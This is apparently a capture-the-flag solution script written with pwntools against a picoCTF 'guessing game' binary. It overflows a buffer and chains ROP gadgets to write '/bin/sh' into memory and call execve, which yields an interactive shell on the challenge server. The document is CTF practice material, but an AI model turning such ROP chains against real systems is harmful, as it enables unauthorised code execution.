from pwn import *

# io = process("./vuln", )

# io = gdb.debug("./vuln", gdbscript='''
# b *0x08049db4
# c
# ''')

io = remote('jupiter.challenges.picoctf.org', 51462)

elf = context.binary = ELF('./vuln')

context.log_level = 'debug'


io.sendlineafter(b'guess?\n',b'84')

offset = 120

bss = 0x00000000006bc3a0

pop_rax = 0x00000000004163f4
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410ca3
pop_rdx = 0x000000000044cc26
syscall = 0x000000000040137c

read = elf.sym['read']
main = elf.sym['main']
payload = b'A'*offset 
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx) + p64(9)
payload += p64(read)
payload += p64(main)


io.sendlineafter(b'Name? ',payload)

io.sendline(b'/bin/sh\x00')


io.sendlineafter(b'guess?\n',b'87')


payload = b'A'*offset 
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(syscall)

io.sendlineafter(b'Name? ',payload)

io.interactive()
'''
Num: 84
Num: 87
Num: 78
Num: 16
Num: 94
Num: 36
Num: 87
Num: 93
Num: 50
Num: 22
'''